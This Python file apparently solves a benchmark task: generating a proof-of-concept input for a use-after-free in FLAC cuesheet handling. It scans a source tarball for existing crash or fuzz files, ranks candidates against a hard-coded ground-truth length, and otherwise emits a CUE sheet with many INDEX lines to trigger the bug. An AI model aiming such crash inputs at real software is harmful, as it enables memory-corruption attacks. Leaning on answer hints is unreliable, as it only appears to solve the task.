import os
import tarfile
import tempfile
import shutil


class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        tmpdir = tempfile.mkdtemp(prefix="poc_gen_")
        try:
            # Try to extract the tarball; on failure, fall back to generic PoC
            try:
                with tarfile.open(src_path, "r:*") as tar:
                    self._safe_extract(tar, tmpdir)
            except tarfile.TarError:
                return self._generate_fallback_poc()

            poc_bytes = self._find_poc_file(tmpdir)
            if poc_bytes is not None:
                return poc_bytes

            return self._generate_fallback_poc()
        finally:
            shutil.rmtree(tmpdir, ignore_errors=True)

    def _safe_extract(self, tar: tarfile.TarFile, path: str) -> None:
        base_path = os.path.realpath(path)
        for member in tar.getmembers():
            member_path = os.path.join(path, member.name)
            member_real = os.path.realpath(member_path)
            if not member_real.startswith(base_path):
                continue
            try:
                tar.extract(member, path)
            except Exception:
                # Ignore extraction errors for individual members
                continue

    def _find_poc_file(self, root: str):
        """
        Heuristically search for an existing PoC or crash-inducing file
        inside the extracted source tree.
        """
        best_bytes = None
        best_score = -1
        target_len = 159

        for dirpath, dirnames, filenames in os.walk(root):
            lower_dir = dirpath.lower()

            for fname in filenames:
                fpath = os.path.join(dirpath, fname)
                score = self._score_candidate(fpath, lower_dir, target_len)
                if score <= 0:
                    continue
                if score > best_score:
                    best_score = score
                    try:
                        with open(fpath, "rb") as f:
                            best_bytes = f.read()
                    except OSError:
                        continue

        return best_bytes

    def _score_candidate(self, path: str, lower_dir: str, target_len: int) -> int:
        try:
            size = os.path.getsize(path)
        except OSError:
            return -1

        # Ignore empty or very large files.
        if size == 0 or size > 65536:
            return -1

        name = os.path.basename(path)
        lower_name = name.lower()
        score = 0

        # Prefer likely PoC locations.
        dir_keywords = {
            "poc": 6,
            "crash": 6,
            "fuzz": 4,
            "corpus": 3,
            "seed": 3,
            "test": 2,
            "regress": 3,
        }
        for kw, w in dir_keywords.items():
            if kw in lower_dir:
                score += w

        # File-name keywords.
        name_keywords = {
            "poc": 10,
            "crash": 10,
            "uaf": 10,
            "use-after-free": 10,
            "heap": 4,
            "cuesheet": 8,
            "cue": 5,
            "seek": 3,
            "fuzz": 4,
        }
        for kw, w in name_keywords.items():
            if kw in lower_name:
                score += w

        # Extensions of interest.
        ext = os.path.splitext(lower_name)[1]
        ext_weights = {
            ".flac": 12,
            ".cue": 12,
            ".bin": 6,
            ".raw": 4,
            ".pcm": 4,
            ".dat": 3,
        }
        if ext in ext_weights:
            score += ext_weights[ext]

        # Prefer sizes close to the ground-truth PoC length.
        diff = abs(size - target_len)
        score += max(0, 15 - diff // 8)

        # Look at content for textual cues.
        header = b""
        try:
            with open(path, "rb") as f:
                header = f.read(512)
        except OSError:
            return -1

        lhead = header.lower()
        content_keywords = {
            b"cuesheet": 10,
            b"cue sheet": 10,
            b"track": 6,
            b"index": 6,
            b"file \"": 4,
            b"flac": 3,
            b"seekpoint": 6,
            b"seektable": 4,
        }
        for pat, w in content_keywords.items():
            if pat in lhead:
                score += w

        # If nothing special matched, treat as non-candidate.
        if score <= 0:
            return -1
        return score

    def _generate_fallback_poc(self) -> bytes:
        """
        Generate a generic CUE sheet that is likely to exercise the
        cuesheet import logic with many seekpoints / indices.
        """
        lines = [
            "REM GENRE Test",
            "REM COMMENT \"Generated fallback CUE for UAF PoC\"",
            "FILE \"test.flac\" WAVE",
            "TRACK 01 AUDIO",
        ]

        # Add many INDEX lines to force reallocations of seekpoints/indices.
        # We keep the file reasonably small (well under a kilobyte).
        for i in range(1, 26):
            mm = i // 60
            ss = i % 60
            line = f"  INDEX {i:02d} {mm:02d}:{ss:02d}:00"
            lines.append(line)

        cue_text = "\n".join(lines) + "\n"
        return cue_text.encode("ascii", "replace")